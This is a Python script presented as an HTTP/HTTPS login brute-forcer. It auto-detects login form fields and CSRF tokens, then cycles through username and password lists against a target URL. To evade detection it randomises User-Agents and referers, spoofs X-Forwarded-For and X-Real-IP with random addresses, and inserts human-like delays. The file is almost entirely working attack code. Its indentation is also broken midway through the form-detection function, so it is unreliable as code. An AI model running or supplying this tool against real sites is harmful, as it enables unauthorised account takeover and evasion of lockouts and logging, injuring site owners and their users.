# Sophisticated HTTP/HTTPS brute-forcer (supports PHP login forms and other common web stacks)
import argparse
import requests
import random
import time
import re
import sys
from bs4 import BeautifulSoup
from fake_useragent import UserAgent

# List of possible referers for randomization
REFERERS = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://www.yahoo.com/",
    "https://duckduckgo.com/",
    "https://www.yandex.com/",
]

# Failure and success patterns
FAILURE_PATTERNS = [
    re.compile(r"invalid password", re.I),
    re.compile(r"incorrect login", re.I),
    re.compile(r"login failed", re.I),
    re.compile(r"302.*(?:/login|\?error=)", re.I),
]
SUCCESS_PATTERNS = [
    re.compile(r"dashboard", re.I),
    re.compile(r"logout", re.I),
    re.compile(r"welcome", re.I),
    re.compile(r"session", re.I),
]

def random_ip():
    """Generate a random IPv4 address for X-Forwarded-For spoofing."""
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

def human_delay(jitter=0.45, base=0.7):
    """Emulate human interaction delays with jitter."""
    delay = random.uniform(base, base + jitter)
    time.sleep(delay)

def parse_args():
    parser = argparse.ArgumentParser(
        description="Sophisticated HTTP/HTTPS brute-forcer (supports PHP login forms and other common stacks)"
    )
    parser.add_argument("url", help="Target login URL")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-l", "--login", help="Single username")
    group.add_argument("-L", "--userlist", help="File with usernames")
    parser.add_argument("-P", "--passlist", required=True, help="File with passwords")
    # Manual override for field names
    parser.add_argument("--user-field", help="Override for username field name (for tricky/PHP forms)")
    parser.add_argument("--pass-field", help="Override for password field name (for tricky/PHP forms)")
    return parser.parse_args()

def detect_form_fields(html):
    """Heuristic form field detection, improved for PHP forms."""
    soup = BeautifulSoup(html, "html.parser")
    forms = soup.find_all("form")
    login_forms = []
    # Common PHP login field names
    USER_CANDIDATES = [
    r"user", r"uname", r"login", r"email", r"userid", r"username", r"user_name", r"usr",
    r"account", r"member", r"profile", r"user_id", r"accountname", r"membername", r"nickname", r"handle",
    r"useraccount", r"userprofile", r"userlogin", r"useremail", r"mail", r"user_mail", r"accountid", r"account_id",
    r"contact", r"contact_email", r"contactname", r"usercontact", r"user_mailid", r"userhandle", r"usernick", r"nickname",
    r"person", r"personid", r"person_name", r"personlogin", r"person_email", r"personid", r"personaccount", r"usernumber",
    r"useridnumber", r"user_num", r"usercode", r"user_code", r"memberid", r"memberidnumber", r"member_id", r"member_code",
    r"client", r"clientid", r"clientname", r"client_user", r"clientaccount", r"clientlogin", r"clientemail", r"userclient",
    r"customer", r"customerid", r"customer_name", r"customerlogin", r"customeremail", r"customernumber", r"usercustomer",
    r"subscriber", r"subscriberid", r"subscriber_name", r"subscriberlogin", r"subscriberemail", r"subscribernumber",
    r"registrant", r"registrantid", r"registrant_name", r"registrantlogin", r"registrantemail", r"registrantnumber",
    r"participant", r"participantid", r"participant_name", r"participantlogin", r"participantemail", r"participantnumber",
    r"admin", r"adminid", r"admin_name", r"adminlogin", r"adminemail", r"adminnumber", r"useradmin", r"user_admin",
    r"operator", r"operatorid", r"operator_name", r"operatorlogin", r"operatoremail", r"operatornumber", r"useroperator",
    r"staff", r"staffid", r"staff_name", r"stafflogin", r"staffemail", r"staffnumber", r"userstaff",
    r"employee", r"employeeid", r"employee_name", r"employeelogin", r"employeeemail", r"employeenumber", r"useremployee",
    r"identity", r"identityid", r"identity_name", r"identitylogin", r"identityemail", r"identitynumber", r"useridentity",
    r"accountnumber", r"useraccountnumber", r"name", r"fullname", r"userfullname", r"displayname", r"userdisplay",
    r"owner", r"ownerid", r"ownername", r"ownerlogin", r"owneremail", r"ownernumber", r"userowner",
    r"auth_user", r"authid", r"authname", r"authlogin", r"authemail", r"authnumber", r"userauth",
    r"author", r"authorid", r"authorname", r"authorlogin", r"authoremail", r"authornumber", r"userauthor",
    r"principal", r"principalid", r"principalname", r"principallogin", r"principalemail", r"principalnumber",
    r"account_holder", r"user_account_holder", r"login_id", r"user_login_id", r"member_login_id", r"account_login_id",
    r"user_ref", r"userreference", r"userref", r"userkey", r"user_key", r"user_token", r"user_identifier", r"user_label",
    r"user_tag", r"userattr", r"userproperty", r"userval", r"user_value", r"userinput", r"user_entry", r"user_record",
    r"user_field", r"userparam", r"user_parameter", r"user_arg"
]

PASS_CANDIDATES = [
    r"pass", r"password", r"passwd", r"pwd", r"userpass", r"passcode", r"pass_word", r"passphrase",
    r"secret", r"secrete", r"secretkey", r"secret_key", r"usersecret", r"key", r"private_key", r"privatekey",
    r"authpass", r"loginpass", r"login_password", r"account_password", r"accountpass", r"memberpass", r"member_password",
    r"adminpass", r"admin_password", r"adminpwd", r"admin_secret", r"operatorpass", r"operator_password", r"clientpass",
    r"client_password", r"userpwd", r"user_password", r"user_passwd", r"user_passcode", r"securitycode", r"security_code",
    r"accesscode", r"access_code", r"accesskey", r"access_key", r"token", r"apitoken", r"api_token", r"auth_token",
    r"sessionpass", r"session_password", r"sessionkey", r"session_key", r"sessiontoken", r"session_token", r"hash",
    r"hashpass", r"hash_password", r"encryptedpass", r"encrypted_password", r"encryptedpwd", r"cryptpass", r"crypt_password",
    r"cryptpwd", r"pin", r"pincode", r"pin_code", r"securitypin", r"security_pin", r"passphrase", r"phrase",
    r"unlockcode", r"unlock_code", r"unlockkey", r"unlock_key", r"unlocktoken", r"unlock_token", r"resetcode",
    r"reset_code", r"password_reset", r"recoverycode", r"recovery_code", r"recoverykey", r"recovery_key", r"pass_reset",
    r"temp_pass", r"temporary_password", r"temp_password", r"temppass", r"one_time_password", r"otp", r"onetimepass",
    r"onetimepassword", r"one_time_pass", r"one_time_key", r"changepass", r"change_password", r"newpass", r"new_password",
    r"newpwd", r"oldpass", r"old_password", r"oldpwd", r"currentpass", r"current_password", r"currentpwd",
    r"userpin", r"user_pin", r"memberpin", r"member_pin", r"clientpin", r"client_pin", r"apipass", r"api_pass",
    r"apipassword", r"api_password", r"apikey", r"api_key", r"authkey", r"auth_key", r"authpwd", r"auth_password",
    r"loginpwd", r"login_password", r"login_key", r"login_secret", r"access_token", r"tokenpw", r"token_pwd",
    r"resetpwd", r"reset_password", r"password1", r"password2", r"password3", r"password4", r"password5",
    r"dbpassword", r"db_password", r"database_password", r"databasepass", r"dbpass", r"db_pass", r"dbpwd", r"db_pwd",
    r"pwd1", r"pwd2", r"pwd3", r"pwd4", r"pwd5", r"mailpassword", r"mail_password", r"emailpassword", r"email_password",
    r"mailpass", r"mail_pass", r"emailpass", r"email_pass", r"ftp_password", r"ftppass", r"ftppwd", r"ftp_passwd"
]
    for form in forms:
        inputs = form.find_all("input")
        field_names = {"username": None, "password": None, "csrf": None, "others": {}}
        for inp in inputs:
            name = inp.get("name", "")
            typ = inp.get("type", "")
            # Username detection
            if any(re.fullmatch(c, name, re.I) or re.search(c, name, re.I) for c in USER_CANDIDATES):
                field_names["username"] = name
            # Password detection
            elif typ == "password" or any(re.fullmatch(c, name, re.I) or re.search(c, name, re.I) for c in PASS_CANDIDATES):
                field_names["password"] = name
            elif typ == "hidden" and ("csrf" in name.lower() or "token" in name.lower()):
                field_names["csrf"] = name
                field_names["others"][name] = inp.get("value", "")
            elif typ == "hidden":
                field_names["others"][name] = inp.get("value", "")
        if field_names["username"] and field_names["password"]:
            login_forms.append((form, field_names))
    return login_forms[0] if login_forms else (None, None)

def detect_success_failure(resp, old_body):
    """Heuristically detect login success or failure."""
    # Check status code and redirect
    if resp.status_code in [301, 302, 303, 307, 308]:
        loc = resp.headers.get("Location", "")
        for pat in FAILURE_PATTERNS:
            if pat.search(loc):
                return False
        for pat in SUCCESS_PATTERNS:
            if pat.search(loc):
                return True
    # Check body
    body = resp.text
    if old_body and body != old_body:
        for pat in SUCCESS_PATTERNS:
            if pat.search(body):
                return True
    for pat in FAILURE_PATTERNS:
        if pat.search(body):
            return False
    # Check for session cookie issued
    if "set-cookie" in resp.headers:
        cookies = resp.cookies.get_dict()
        if any("session" in k.lower() or "auth" in k.lower() for k in cookies):
            return True
    # If form is not re-presented
    if old_body and "form" in old_body and "form" not in body:
        return True
    return False

def load_list(filename):
    with open(filename, "r", encoding="utf-8") as f:
        return [line.strip() for line in f if line.strip()]

def random_headers():
    ua = UserAgent()
    headers = {
        "User-Agent": ua.random,
        "Referer": random.choice(REFERERS),
        "X-Forwarded-For": random_ip(),
        "X-Real-IP": random_ip(),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
    }
    return headers

def brute(url, users, passwords, user_field=None, pass_field=None):
    sess = requests.Session()
    try:
        resp = sess.get(url, headers=random_headers(), timeout=10)
    except Exception as e:
        print(f"[!] Error connecting to target: {e}")
        sys.exit(1)
    old_body = resp.text
    form, fields = detect_form_fields(resp.text)
    # Manual override
    if fields is None:
        fields = {"username": None, "password": None, "csrf": None, "others": {}}
    if user_field:
        fields["username"] = user_field
    if pass_field:
        fields["password"] = pass_field
    if not form or not fields["username"] or not fields["password"]:
        print("[!] No login form detected, exiting.")
        print("    [*] Try --user-field and --pass-field to specify field names manually.")
        sys.exit(1)
    action = form.get("action") or url
    method = form.get("method", "post").lower()
    if not action.startswith("http"):
        action = requests.compat.urljoin(url, action)
    print(f"[+] Login form detected at {action} ({method.upper()})")
    print(f"    [*] Username field: {fields['username']}, Password field: {fields['password']}")
    for user in users:
        for passwd in passwords:
            data = {}
            data[fields["username"]] = user
            data[fields["password"]] = passwd
            # Add hidden fields, e.g. CSRF tokens
            for k, v in fields["others"].items():
                data[k] = v
            # Sometimes hidden fields need to be refreshed each time
            if fields.get("csrf"):
                # Try to refresh token
                try:
                    fresh = sess.get(url, headers=random_headers(), timeout=10)
                    _, fields_new = detect_form_fields(fresh.text)
                    if fields_new and fields_new["csrf"]:
                        data[fields_new["csrf"]] = fields_new["others"].get(fields_new["csrf"], "")
                except Exception:
                    pass
            headers = random_headers()
            human_delay()
            print(f"[.] Trying {user}:{passwd} ...", end=" ")
            try:
                if method == "post":
                    r = sess.post(action, data=data, headers=headers, allow_redirects=True, timeout=10)
                else:
                    r = sess.get(action, params=data, headers=headers, allow_redirects=True, timeout=10)
            except Exception as e:
                print(f"error: {e}")
                continue
            if detect_success_failure(r, old_body):
                print("\n[+] SUCCESS!")
                print(f"Username: {user}\nPassword: {passwd}")
                return
            else:
                print("fail")
    print("[-] No valid credentials found.")

def main():
    args = parse_args()
    if args.login:
        users = [args.login]
    else:
        users = load_list(args.userlist)
    passwords = load_list(args.passlist)
    brute(args.url, users, passwords, args.user_field, args.pass_field)

if __name__ == "__main__":
    main()
